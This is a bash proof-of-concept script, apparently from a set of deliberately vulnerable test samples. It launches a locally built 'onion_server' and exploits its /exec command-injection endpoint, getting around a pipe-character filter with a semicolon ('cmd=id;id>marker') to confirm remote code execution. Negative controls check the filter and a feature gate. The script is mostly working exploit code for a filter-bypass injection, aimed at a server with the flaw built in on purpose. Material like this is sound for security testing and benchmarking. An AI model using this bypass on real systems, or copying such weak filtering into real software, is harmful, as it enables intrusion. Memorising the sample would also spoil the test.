#!/usr/bin/env bash
# PoC for 094_onion_C2I1S2
# Axes: C2 (two flags + struct) / I1 (direct to system()) / S2 (block pipe, bypass semicolon)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (onion_server) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/onion_server"
WWWROOT="/tmp/poc_094_www"
MARKER="/tmp/poc_094_marker"
PORT=18094

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting onion_server with --exec-mode --debug-mode on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode --debug-mode --wwwroot "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# ── trigger ────────────────────────────────────────────────────────────────────
# S2: pipe (|) is blocked; bypass via semicolon (;)
# I1: cmd flows directly to system()
echo "[*] sending payload: cmd=id;id>${MARKER}  (semicolon bypass of pipe filter)"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id%3B id>${MARKER}" > /dev/null || \
    curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control 1: pipe is blocked ────────────────────────────────────────
echo "[*] verifying S2: pipe character must be blocked..."
rm -f "$MARKER"
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/exec?cmd=id|tee%20${MARKER}" || true)
if [[ "$HTTP_CODE" == "400" ]]; then
    echo "[+] S2 check passed: pipe blocked with 400"
else
    echo "[!] S2 check unexpected response: $HTTP_CODE"
fi

# ── negative control 2: endpoint absent without --exec-mode ───────────────────
echo "[*] verifying C2 gate: endpoint must be absent without --exec-mode..."
NEG_PORT=19094
"$BINARY" --port "$NEG_PORT" --wwwroot "$WWWROOT" &
SAFE_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
